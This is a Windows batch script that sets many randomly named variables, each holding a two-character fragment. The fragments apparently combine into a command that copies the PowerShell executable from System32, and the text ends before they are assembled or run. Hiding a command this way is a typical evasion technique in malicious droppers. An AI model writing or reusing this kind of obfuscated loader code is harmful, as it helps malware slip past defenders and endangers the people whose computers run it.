@echo off
set "lfOiRSwcxo=s\"
set "IQkaOZTsde=Sy"
set "hvkSKxVBWf= C"
set "XAwTAveHpC=in"
set "wULQNEsqik=co"
set "mVHVeLbBCF=.e"
set "oWzUNSxVDL=ll"
set "RAHbEzNxWu=ws"
set "hUJPsyUVFD=st"
set "ybGcAkAzgS= /"
set "PVXWgdlCrn=Po"
set "NkiFtlAjHY=y "
set "gifMJlZICm=he"
set "gtOwiiuwht=ll"
set "kQmqFfoiYo=1."
set "SEQpAwTupb=rS"
set "MJVNvWwXAa=xe"
set "EHwSISHtoD=32"
set "IRucCRHCtO=ow"
set "rIVhWbJTgq=nd"
set "GhBzFYWUji=py"
set "qoYivvPeqV=Wi"
set "DoWpbiHpYG=rs"
set "nnIQBkeHvJ=\v"
